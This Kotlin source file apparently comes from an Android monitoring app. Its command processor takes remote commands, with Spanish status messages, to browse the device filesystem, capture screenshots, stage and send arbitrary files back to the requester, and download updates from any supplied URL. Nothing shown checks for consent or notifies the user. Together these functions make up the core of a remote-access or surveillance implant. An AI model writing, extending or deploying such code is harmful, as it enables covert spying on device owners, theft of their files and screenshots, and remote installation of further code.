package com.kryos.monitor.command

import java.io.File
import com.kryos.monitor.update.UpdateManager
import com.kryos.monitor.screenshot.ScreenshotManager



import android.content.Context

class CommandProcessor(
    private val context: Context
) {
    private val session = CommandSession()
    private val explorer = FileExplorer(session)
    private val updateManager = UpdateManager(context)

    private var pendingDownload: File? = null

    fun execute(request: CommandRequest): CommandResult {

        return when (request.cmd.lowercase()) {
	    "update" -> {

    val url = request.url

    if (url.isNullOrBlank()) {

        CommandResult.Response(
            CommandResponse(
                id = request.id,
                status = "error",
                message = "URL requerida"
            )
        )

    } else {

        updateManager.startUpdate(url)

        CommandResult.Response(
            CommandResponse(
                id = request.id,
                status = "ok",
                message = "Actualización iniciada"
            )
        )

    }

}
            "pwd" -> {

                CommandResult.Response(
                    CommandResponse(
                        id = request.id,
                        status = "ok",
                        cwd = session.pwd()
                    )
                )

            }

            "ls" -> {

                CommandResult.Response(
                    CommandResponse(
                        id = request.id,
                        status = "ok",
                        cwd = session.pwd(),
                        items = explorer.list()
                    )
                )

            }

            "cd" -> {

                val path = request.path

                if (path.isNullOrBlank()) {

                    CommandResult.Response(
                        CommandResponse(
                            id = request.id,
                            status = "error",
                            message = "Ruta requerida",
                            cwd = session.pwd()
                        )
                    )

                } else if (session.changeDirectory(path)) {

                    CommandResult.Response(
                        CommandResponse(
                            id = request.id,
                            status = "ok",
                            cwd = session.pwd()
                        )
                    )

                } else {

                    CommandResult.Response(
                        CommandResponse(
                            id = request.id,
                            status = "error",
                            message = "No se pudo cambiar de directorio",
                            cwd = session.pwd()
                        )
                    )

                }

            }

            "stat" -> {

                val name = request.file

                if (name.isNullOrBlank()) {

                    CommandResult.Response(
                        CommandResponse(
                            id = request.id,
                            status = "error",
                            message = "Archivo requerido"
                        )
                    )

                } else {

                    val info = explorer.stat(name)

                    if (info == null) {

                        CommandResult.Response(
                            CommandResponse(
                                id = request.id,
                                status = "error",
                                message = "Archivo no encontrado"
                            )
                        )

                    } else {

                        CommandResult.Response(
                            CommandResponse(
                                id = request.id,
                                status = "ok",
                                cwd = session.pwd(),
                                file = info
                            )
                        )

                    }

                }

            }
"screenshot" -> {

    val screenshot = ScreenshotManager.captureScreenshot()

    if (screenshot == null || !screenshot.exists()) {

        CommandResult.Response(
            CommandResponse(
                id = request.id,
                status = "error",
                message = "No fue posible capturar la pantalla"
            )
        )

    } else {

        pendingDownload = screenshot

        CommandResult.Response(
            CommandResponse(
                id = request.id,
                status = "ready",
                message = screenshot.name
            )
        )

    }

}

            "dw" -> {

                val name = request.file

                if (name.isNullOrBlank()) {

                    CommandResult.Response(
                        CommandResponse(
                            id = request.id,
                            status = "error",
                            message = "Archivo requerido"
                        )
                    )

                } else {

                    val target = explorer.getFile(name)

                    if (target == null) {

                        CommandResult.Response(
                            CommandResponse(
                                id = request.id,
                                status = "error",
                                message = "Archivo no encontrado"
                            )
                        )

                    } else {

                        pendingDownload = target

                        CommandResult.Response(
                            CommandResponse(
                                id = request.id,
                                status = "ready",
                                message = target.name
                            )
                        )

                    }

                }

            }

            "send" -> {

                val file = pendingDownload

                if (file == null || !file.exists()) {

                    CommandResult.Response(
                        CommandResponse(
                            id = request.id,
                            status = "error",
                            message = "No hay descarga pendiente"
                        )
                    )

                } else {

                    pendingDownload = null

                    CommandResult.Download(
                        id = request.id,
                        file = file
                    )

                }

            }

            else -> {

                CommandResult.Response(
                    CommandResponse(
                        id = request.id,
                        status = "error",
                        message = "Comando desconocido"
                    )
                )

            }

        }

    }

}
